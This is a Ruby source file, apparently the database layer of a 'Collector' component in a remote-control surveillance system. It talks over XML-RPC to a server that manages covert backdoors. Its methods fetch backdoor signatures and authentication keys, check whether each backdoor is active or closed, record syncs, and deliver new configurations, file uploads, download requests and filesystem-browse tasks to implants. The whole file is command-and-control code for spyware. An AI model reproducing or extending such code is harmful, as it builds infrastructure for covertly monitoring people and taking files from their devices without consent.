#
#  DB layer for XML-RPC communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'xmlrpc/client'
require 'timeout'

module RCS
module Collector

class DB_xmlrpc
  include RCS::Tracer

  DB_TIMEOUT = 5

  def initialize(host)
    @host, @port = host.split(':')

    # create the xml-rpc server
    @xmlrpc = XMLRPC::Client.new(@host, '/server.php', @port, nil, nil, nil, nil, true)
    
    # we need to set an attribute inside the http instance variable of @server
    # we can get a reference here and manipulate it later
    @http = @xmlrpc.instance_variable_get(:@http)

    # no SSL verify for this connection
    #@http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Dir.pwd + "/config/" + Config.instance.global['DB_CERT']

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/" + Config.instance.global['DB_CERT']))

    trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def xmlrpc_call(*args)
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @xmlrpc.call(*args)
      end
    rescue
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_timeout(e)
    # the db is down we have to report it to the upper layer
    if e.class.eql? Timeout::Error then
        trace :warn, "The DB in not responding within #{DB_TIMEOUT} seconds..."
        raise
    end
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      response = xmlrpc_call('auth.login', user, pass)
      return true
    rescue Exception => e
      
      # we can get a "method not found" error only if we are already logged in
      # in this case, we force a logout and retry the login
      if e.respond_to?(:faultCode) and e.faultCode == -32601 then  # -32601 is METHOD NOT FOUND
        trace :debug, "forcing logout and retrying..."
        logout
        return login(user, pass)
      end

      trace :error, "Error calling auth.login: #{e.class} #{e.message}"

      return false
    end
  end

  def logout
    begin
      response = xmlrpc_call('auth.logout')
      trace :debug, "XML-RPC logout: #{response}"
      return true
    rescue Exception => e
      trace :error, "Error calling auth.logout: #{e.class} #{e.message}"
      return false
    end
  end

  def update_status(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      xmlrpc_call('monitor.set', component, remoteip, status, message, disk, cpu, pcpu)
    rescue Exception => e
      trace :error, "Error calling monitor.set: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  # per customer signature
  def backdoor_signature
    begin
      return xmlrpc_call('sign.get', "backdoor")
    rescue Exception => e
      trace :error, "Error calling sign.get: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  # used to authenticate the backdoors
  def class_keys(build_id = '')
    begin
      list = xmlrpc_call('backdoor.getclasskey', build_id)
      # if we are are requesting a specific build_id, return only the key
      return list[0]['classkey'] if build_id.length > 0

      # otherwise return all the results by converting
      # the response into an hash indexed by 'build'
      class_keys = {}
      list.each do |elem|
        class_keys[elem['build']] = elem['classkey']
      end
      return class_keys
    rescue Exception => e
      trace :error, "Error calling backdoor.getclasskey: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  # backdoor identify
  def status_of(build_id, instance_id, subtype)
    begin
      ret = xmlrpc_call('backdoor.identify', build_id, instance_id, subtype)
      bid = ret['backdoor_id']
      if ret['deleted'] == 1 then
        return DB::DELETED_BACKDOOR, bid
      end
      case ret['status']
        when 'OPEN'
          return DB::ACTIVE_BACKDOOR, bid
        when 'QUEUED'
          return DB::QUEUED_BACKDOOR, bid
        when 'CLOSED'
          return DB::CLOSED_BACKDOOR, bid
      end
    rescue Exception => e
      # 1702 is NO SUCH BACKDOOR
      if e.respond_to?(:faultCode) and e.faultCode == 1702 then
        return DB::NO_SUCH_BACKDOOR, 0
      end

      trace :error, "Error calling backdoor.identify: #{e.class} #{e.message}"
      propagate_timeout e

      return DB::UNKNOWN_BACKDOOR, 0
    end
  end

  # the sync date is sent to the database here
  def sync_for(bid, version, user, device, source, time)
    begin
      xmlrpc_call('backdoor.sync', bid, source, user, device, version, time)
    rescue Exception => e
      trace :error, "Error calling backdoor.sync: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  # generic function to retrieve a large file from the db
  def get_file(*resource)

    # prepare the http request
    # (for performance reasons could be useful to instantiate a new one)
    #http = Net::HTTP.new(@host, @port)
    #http.use_ssl = true
    #http.ca_file = @http.ca_file
    #http.cert = @http.cert
    #http.read_timeout = 5

    # the HTTP headers for the authentication
    headers = {
      'Cookie' => @xmlrpc.cookie,
      'Content-Type' => 'application/x-www-form-urlencoded',
    }

    # prepare the post request
    poststring = ""
    resource.first.each_pair do |key, value|
      poststring += "#{key}=#{value}&"
    end

    # use the new http object
    #resp = http.request_post('/download.php', poststring, headers)

    # use the already established http(s) connection
    resp = @http.request_post('/download.php', poststring, headers)
    
    return resp.body
  end

  # retrieve the new config for a backdoor (if any)
  def new_conf(bid)
    begin
      ret = xmlrpc_call('config.getnew', bid)
      cid = ret['config_id']

      return 0 if cid == 0

      # retrieve the file from the db
      config = get_file :resource => 'config', :config_id => cid

      return cid, config
    rescue Exception => e
      trace :error, "Error calling config.getnew: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  def conf_sent(cid)
    begin
      xmlrpc_call('config.setsent', cid)
    rescue Exception => e
      trace :error, "Error calling config.setsent: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  def new_uploads(bid)
    begin
      ret = xmlrpc_call('upload.get', bid)

      upl = {}
      # parse the results and get the contents of the uploads
      ret.each do |elem|
        upl[elem['upload_id']] = {:filename => elem['filename'],
                                  :content => get_file(:resource => 'upload', :upload_id => elem['upload_id'])}
      end

      return upl
    rescue Exception => e
      trace :error, "Error calling download.get: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  def del_upload(id)
    begin
      xmlrpc_call('upload.del', id)
    rescue Exception => e
      trace :error, "Error calling upload.del: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  # retrieve the download list from db (if any)
  def new_downloads(bid)
    begin
      ret = xmlrpc_call('download.get', bid)

      down = {}
      # parse the results
      ret.each do |elem|
        down[elem['download_id']] = elem['filename']
      end
      
      return down
    rescue Exception => e
      trace :error, "Error calling download.get: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  def del_download(id)
    begin
      xmlrpc_call('download.del', id)
    rescue Exception => e
      trace :error, "Error calling download.del: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  # retrieve the filesystems list from db (if any)
  def new_filesystems(bid)
    begin
      ret = xmlrpc_call('filesystem.get', bid)

      files = {}
      # parse the results
      ret.each do |elem|
        files[elem['filesystem_id']] = {:depth => elem['depth'], :path => elem['path']}
      end
      
      return files
    rescue Exception => e
      trace :error, "Error calling filesystem.get: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

  def del_filesystem(id)
    begin
      xmlrpc_call('filesystem.del', id)
    rescue Exception => e
      trace :error, "Error calling filesystem.del: #{e.class} #{e.message}"
      propagate_timeout e
    end
  end

end #

end #Collector::
end #RCS::